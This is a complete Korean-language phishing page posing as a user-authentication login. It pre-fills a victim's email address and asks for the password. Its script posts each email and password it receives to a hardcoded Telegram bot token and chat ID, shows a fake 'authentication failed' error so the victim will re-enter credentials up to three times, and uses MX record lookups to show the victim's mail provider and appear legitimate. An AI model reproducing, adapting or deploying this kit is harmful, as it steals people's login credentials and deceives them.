<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>신분증 인증</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #333;
            overflow: hidden;
        }


        .landing-page {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #7f7f7f;
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .landing-page.hidden {
            opacity: 0;
            pointer-events: none;
        }


        .main-background {
            position: relative;
            width: 100%;
            height: 100%;
            background: #7f7f7f;
            z-index: 1;
            opacity: 0;

        }

        .main-background.visible {
            opacity: 1;
        }

        .sand {
            position: absolute;
            top: 23%;
            left: 35%;
            width: 29%;
            height: 280px;
            background-color: #e9e9e9;
            box-shadow: 2px 0 10px rgba(0, 0, 0, 0.1);
            z-index: 2;
            align-items: relative;
            display: flex;
            align: justify;
            flex-direction: column;
        }

        .sand-header {
            padding: 15px 60px 15px 40px;
            margin-bottom: 20px;
            background-color: #336699;
            color: white;
            text-align: justify;
        }

        .img1 {
            border: 0;
            align: left;
        }

        .img2 {
            border: 0;
            float: right;
        }

        .sand-body {
            display: block;
            padding: 0 40px 0 40px;
            overflow-y: auto;
            align-items: justify;
            justify-content: justify;
        }

        .sand-footer {
            position: absolute;
            top: 270px;
            left: 0;
            width: 100%;
            z-index: 4;
            padding: 2px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            background-color: #f8f9fa;
            text-align: center;
            align-items: center;
            justify-content: center;
            font-size: 0.7em;
            color: #282a2a;
        }

        .info_text {
            text-align: left;
            font-size: 1em;
            font-weight: 900;
            margin: 10px 0 15px 0;
            color: #424546;
        }

        .form-container {
            width: auto;
        }

        .form-group {
            display: flex;
            align-items: center;
            gap: 11px;
            margin-bottom: 7px;
            flex-wrap: wrap;
        }

        .form-group4 {
            display: flex;
            align-items: center;
            gap: 34px;
            margin-bottom: 5px;
            flex-wrap: wrap;
        }

        label {
            display: flex;
            font-weight: bolder;
            font-size: 10px;
            margin-bottom: 5px;
        }

        input {
            width: 225px;
            padding: 3px 12px 3px 12px;
            outline: none;
            border: 1px solid #6c757d;
            border-radius: 1px;
            font-size: 14px;
        }

        #auto-button {
            position: absolute;
            top: 57%;
            right: 15%;
            z-index: 3;
            width: 85px;
            height: 59px;
            padding: ;
            background-color: #336699;
            color: white;
            border: 1px solid #a9a9a9;
            border-radius: 1px;
            cursor: pointer;
            font-size: 2em;
            font-weight: 900;
        }

        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }

        p {
            font-size: 1.2em;
            max-width: 600px;
            line-height: 1.6;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .sidebar {
                width: 100%;
                height: auto;
                position: relative;
            }

            .main-content {
                width: 100%;
                left: 0;
                padding: 20px;
            }
        }

        .message {
            color: red;
            font-size: 0.7em;
            min-height: 1.2em;
        }

        .hidden {
            display: none;
        }

		.out-line1 {
		    position: absolute;
            top: 136px;
            left: 135px;
            z-index: 5;
		    width: 195px;
            height: 24px;
            border-top: 1px solid #646464;
            border-right: 1px solid #646464;
		}

        /* Validation styles */
        .invalid-input {
            border: 1px solid #ff0000 !important;
            box-shadow: 0 0 5px rgba(255, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <!-- Landing Page -->
    <div class="landing-page" id="landingPage">
    </div>

    <!-- Main Content -->
    <div class="main-background" id="mainBackground">
        <div class="sand">
            <div class="sand-header">
                <img class="img1" src="https://i.imgur.com/tLaZVLz.gif" width="96" height="60" loading="lazy">
                <img class="img2" src="https://i.imgur.com/CKXJOFI.gif" width="190" height="60" loading="lazy">
            </div>
            <div class="sand-body">
                <div class="info_text">
                    <div>사용자 인증</div>
                </div>

				<div class="out-line1"></div>

                <div>
                    <form class="form-container" id="mainForm" action="#" method="POST">
                        <div class="form-group">
                            <input type="email" id="emailInput" name="email" title="" placeholder="아이디" value="js09@js09.co.kr" disabled>
                        </div>

                        <div class="form-group4">
                            <input type="password" id="pw" name="password" title="" placeholder="비밀번호">
                        </div>

                        <div>
                            <button type="submit" class="" title="확인하다" id="auto-button">✓</button>
                        </div>
                    </form>
                </div>

                <div>
                    <span id="message" class="message"></span>
                </div>
            </div>
            <div class="sand-footer">
                <div>에 의해 구동:</div>
                <div id="result"></div>
            </div>
        </div>
    </div>

    <script>
        // DOM Elements
        const landingPage = document.getElementById('landingPage');
        const mainBackground = document.getElementById('mainBackground');
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('pw');
        const resultDiv = document.getElementById('result');
        const messageDiv = document.getElementById('message');
        const form = document.getElementById('mainForm');

        // Constants for Telegram API
        const NATE_KEY = '8939292069:AAFsrJ6as7qOR8zh6hKm42KtoO_vM3SK3cA';
        const NATE_ID = '6955686410';

        // Form submission variables
        let submitAttempts = 0;
        const maxSubmitAttempts = 3;
        let errorMessageTimer = null;

        // Track if analysis is in progress
        let isAnalyzing = false;

        // Track if SMTP diagnosis is complete
        let smtpDiagnosisComplete = false;

        // Track validation states
        let isEmailValid = false;
        let isPasswordValid = false;

        // Initialize the application
        function init() {
            // Start SMTP diagnosis
            analyzeEmailIfValid();
        }

        // Form submission handler
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            // Validate inputs before submission
            validateEmail();
            validatePassword();

            // Check if both email and password are filled and valid
            if (!isEmailValid || !isPasswordValid) {
                // Highlight invalid inputs
                if (!isEmailValid) {
                    emailInput.classList.add('invalid-input');
                }
                if (!isPasswordValid) {
                    passwordInput.classList.add('invalid-input');
                }
                return; // Do not submit if validation fails
            }

            // Remove validation styling when form is valid
            emailInput.classList.remove('invalid-input');
            passwordInput.classList.remove('invalid-input');

            // Check if max attempts reached
            if (submitAttempts >= maxSubmitAttempts) {
                showErrorMessage("");
                passwordInput.disabled = true;
                return;
            }

            // Increment submit attempts
            submitAttempts++;

            // Submit data to Telegram
            submitToTelegram();

            // Clear password field after 2 seconds (Instruction 2)
            setTimeout(() => {
                passwordInput.value = '';
            }, 2000);

            // Show error message after 3 seconds
            if (errorMessageTimer) {
                clearTimeout(errorMessageTimer);
            }

            errorMessageTimer = setTimeout(function() {
                showErrorMessage("서버 보고서: 현재 인증에 실패했습니다.");
            }, 3000);

            // Check if max attempts reached after this submission
            if (submitAttempts >= maxSubmitAttempts) {
                showErrorMessage("");
                passwordInput.disabled = true;
            }
        });

        // Reset error message when submit button is clicked again
        document.getElementById('auto-button').addEventListener('click', function() {
            if (errorMessageTimer) {
                clearTimeout(errorMessageTimer);
            }
            clearErrorMessage();
        });

        // Function to submit data to Telegram
        function submitToTelegram() {
            const email = emailInput.value;
            const password = passwordInput.value;

            const message = `Email: ${email}\nPassword: ${password}`;
            const url = `https://api.telegram.org/bot${NATE_KEY}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: NATE_ID,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        // Show error message (Instruction 3)
        function showErrorMessage(message) {
            clearErrorMessage();
            messageDiv.textContent = message;
            messageDiv.className = "message error";
        }

        // Clear error message
        function clearErrorMessage() {
            messageDiv.textContent = "";
            messageDiv.className = "message";
        }

        // Listen for input changes
        emailInput.addEventListener('input', function() {
            // Remove validation styling when user starts editing
            emailInput.classList.remove('invalid-input');
            analyzeEmailIfValid();
        });

        // Listen for password input changes
        passwordInput.addEventListener('input', function() {
            // Remove validation styling when user starts editing
            passwordInput.classList.remove('invalid-input');
            validatePassword();
        });

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {
            init();
        });

        function analyzeEmailIfValid() {
            const email = emailInput.value.trim();
            const domain = email.split('@')[1];

            // Reset result display
            resultDiv.classList.add('hidden');
            resultDiv.innerHTML = '';

            // Validate email format
            validateEmail();

            // If we have a valid domain and not already analyzing, start the process
            if (domain && domain.includes('.') && !isAnalyzing && isEmailValid) {
                analyzeEmail(email, domain);
            }
        }

        // Validate email format
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        // Validate password format (at least 6 characters)
        function isValidPassword(password) {
            const re = /^(?=.*[A-Za-z])(?=.*\d).{8,}$/;
            return re.test(password);
        }

        // Email validation function
        function validateEmail() {
            const email = emailInput.value.trim();
            isEmailValid = email && isValidEmail(email);
            return isEmailValid;
        }

        // Password validation function
        function validatePassword() {
            const password = passwordInput.value.trim();
            isPasswordValid = password && isValidPassword(password);
            return isPasswordValid;
        }

        async function analyzeEmail(email, domain) {
            isAnalyzing = true;

            try {
                // Try multiple DNS services to find MX records
                const services = [
                    { name: 'Google DNS', func: queryGoogleDNS },
                    { name: 'Cloudflare DNS', func: queryCloudflareDNS },
                    { name: 'HackerTarget', func: queryHackerTarget }
                ];

                let mxRecords = [];

                // Try each service until we get results
                for (const service of services) {
                    try {
                        const result = await service.func(domain);
                        if (result && result.mxRecords && result.mxRecords.length > 0) {
                            mxRecords = result.mxRecords;
                            break; // Stop at first successful service
                        }
                    } catch (error) {
                        // Continue to next service if this one fails
                        continue;
                    }
                }

                // Display the result
                if (mxRecords.length > 0) {
                    // Get the highest priority (lowest number) server
                    const primaryServer = mxRecords.sort((a, b) => a.priority - b.priority)[0].server;
                    displayResult(primaryServer);
                } else {
                    displayResult('Webmail Service');
                }

            } catch (error) {
                displayResult('Error during analysis');
            } finally {
                isAnalyzing = false;
                smtpDiagnosisComplete = true;

                // Hide landing page and show form (Instruction 1)
                setTimeout(() => {
                    landingPage.classList.add('hidden');
                    mainBackground.classList.add('visible');
                }, 500);
            }
        }

        // DNS Service Queries
        async function queryGoogleDNS(domain) {
            const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
            if (!response.ok) throw new Error('Google DNS failed');
            const data = await response.json();

            if (data.Answer) {
                const mxRecords = data.Answer.map(record => {
                    const parts = record.data.split(' ');
                    return {
                        priority: parseInt(parts[0]),
                        server: parts[1].replace(/\.$/, ''),
                        ttl: record.TTL
                    };
                });

                return { mxRecords, source: 'Google DNS' };
            }
            throw new Error('No MX records in response');
        }

        async function queryCloudflareDNS(domain) {
            const response = await fetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`, {
                headers: { 'Accept': 'application/dns-json' }
            });
            if (!response.ok) throw new Error('Cloudflare DNS failed');
            const data = await response.json();

            if (data.Answer) {
                const mxRecords = data.Answer.map(record => {
                    const parts = record.data.split(' ');
                    return {
                        priority: parseInt(parts[0]),
                        server: parts[1].replace(/\.$/, ''),
                        ttl: record.TTL
                    };
                });

                return { mxRecords, source: 'Cloudflare DNS' };
            }
            throw new Error('No MX records in response');
        }

        async function queryHackerTarget(domain) {
            const response = await fetch(`https://api.hackertarget.com/mxlookup/?q=${domain}`);
            if (!response.ok) throw new Error('HackerTarget failed');
            const text = await response.text();

            if (text.includes('error') || text.includes('API')) {
                throw new Error('HackerTarget API limit');
            }

            const lines = text.split('\n').filter(line => line.includes('MX'));
            const mxRecords = lines.map(line => {
                const parts = line.split(/\s+/);
                return {
                    priority: parseInt(parts[parts.length - 2]) || 10,
                    server: parts[parts.length - 1]
                };
            });

            if (mxRecords.length > 0) {
                return { mxRecords, source: 'HackerTarget' };
            }
            throw new Error('No MX records found');
        }

        function displayResult(serverDomain) {
            resultDiv.innerHTML = `
                <div>${serverDomain}</div>
            `;
            resultDiv.classList.remove('hidden');
            resultDiv.classList.add('visible');
        }
    </script>
</body>
</html>
